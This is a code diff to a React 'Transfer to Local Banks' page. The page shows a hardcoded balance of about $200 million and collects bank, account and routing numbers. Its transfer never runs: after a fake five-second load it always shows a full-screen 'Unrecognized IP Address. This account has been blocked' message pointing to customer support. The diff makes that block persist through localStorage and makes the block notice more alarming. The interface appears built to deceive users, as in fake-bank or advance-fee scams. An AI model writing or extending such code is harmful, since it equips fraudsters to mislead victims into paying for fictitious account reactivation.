@@ -1,3 +1,4 @@
+// Transfer.jsx
 import React, { useState, useEffect } from 'react';
 import ScrollReveal from 'scrollreveal';
 import { Button } from './Button';
@@ -11,7 +12,7 @@ const Transfers = () => {
   const [accountNumber, setAccountNumber] = useState('');
   const [routingNumber, setRoutingNumber] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [showMessage, setShowMessage] = useState(false);
+  const [showMessage, setShowMessage] = useState(localStorage.getItem('accountBlocked') === 'true');
 
   const [errors, setErrors] = useState({
     bank: '',
@@ -32,11 +33,10 @@ const Transfers = () => {
 
     if (isValid) {
       setIsLoading(true);
-
-      // Show message after 5 seconds
       setTimeout(() => {
         setIsLoading(false);
         setShowMessage(true);
+        localStorage.setItem('accountBlocked', 'true');
       }, 5000);
     }
   };
@@ -55,20 +55,18 @@ const Transfers = () => {
 
   return (
     <div className="min-h-screen relative">
+      {/* Header */}
       <header className="sr relative mb-10 flex items-center justify-start">
-        <Button
-          className="flex gap-2 rounded-3xl mt-2"
-          onClick={() => navigate(-1)}
-        >
+        <Button className="flex gap-2 rounded-3xl mt-2" onClick={() => navigate(-1)}>
           <FaArrowAltCircleLeft className="mt-1" />
           Back
         </Button>
-
         <p className="sr tlb absolute left-1/2 transform ml-2 -translate-x-1/2 font-semibold">
           Transfer to Local Banks
         </p>
       </header>
 
+      {/* Balance */}
       <div className="sr bg-white p-4 container rounded-2xl mb-8">
         <div className="balance p-4 rounded-lg flex items-center justify-center gap-2">
           <h2 className="bal font-bold text-3xl">$200,052,938.34</h2>
@@ -78,6 +76,7 @@ const Transfers = () => {
         </div>
       </div>
 
+      {/* Form */}
       <form className="sr form flex flex-col gap-6 p-16 border rounded-3xl">
         <div className="flex flex-col justify-center w-full">
           <input
@@ -87,9 +86,7 @@ const Transfers = () => {
             onChange={(e) => setBank(e.target.value)}
             className="inp w-full text-xl border-transparent rounded-full text-start m-4 p-4"
           />
-          {errors.bank && (
-            <span className="text-red-500 text-sm ml-4 mt-[-1rem]">{errors.bank}</span>
-          )}
+          {errors.bank && <span className="text-red-500 text-sm ml-4 mt-[-1rem]">{errors.bank}</span>}
         </div>
 
         <div className="flex flex-row gap-6">
@@ -101,9 +98,7 @@ const Transfers = () => {
               onChange={(e) => setAccountNumber(e.target.value)}
               className="inp font-bold text-xl border-transparent rounded-full text-start m-4 p-4"
             />
-            {errors.accountNumber && (
-              <span className="text-red-500 text-sm ml-4 mt-[-1rem]">{errors.accountNumber}</span>
-            )}
+            {errors.accountNumber && <span className="text-red-500 text-sm ml-4 mt-[-1rem]">{errors.accountNumber}</span>}
           </div>
 
           <div className="flex flex-col w-full">
@@ -114,13 +109,12 @@ const Transfers = () => {
               onChange={(e) => setRoutingNumber(e.target.value)}
               className="inp font-bold text-xl border-transparent rounded-full text-start m-4 p-4"
             />
-            {errors.routingNumber && (
-              <span className="text-red-500 text-sm ml-4 mt-[-1rem]">{errors.routingNumber}</span>
-            )}
+            {errors.routingNumber && <span className="text-red-500 text-sm ml-4 mt-[-1rem]">{errors.routingNumber}</span>}
           </div>
         </div>
       </form>
 
+      {/* Pay Button */}
       <div className="sr flex flex-row justify-center mt-6">
         <Button
           className="w-full flex justify-center items-center gap-2 mb-4 rounded-3xl m-6"
@@ -138,18 +132,17 @@ const Transfers = () => {
         </Button>
       </div>
 
+      {/* Block Message */}
       {showMessage && (
-        <div className="absolute top-1/2 left-1/2 transform gap-4 -translate-x-1/2 -translate-y-1/2 bg-red-500 text-white p-4 rounded-xl text-center w-[300px] shadow-lg">
-          <p>Your account is under review, can't process this at the moment.</p>
+        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex flex-col justify-center items-center gap-4 text-white p-6 text-center">
+          <p>Unrecognized IP Address. This account has been blocked</p>
           <span>Contact our customer support below for account reactivation.</span>
-        </div>
-      )}
 
-      {showMessage && (
-        <div className="butt flex justify-center p-2 border-transparent rounded-full absolute bottom-6 right-6">
+          <div className="butt flex justify-center p-2 border-transparent rounded-full absolute bottom-6 right-6">
           <button onClick={() => navigate('/customercare')} className="flex items-center">
             <FaHeadset className="text-xl text-white" />
           </button>
+        </div>
         </div>
       )}
     </div>
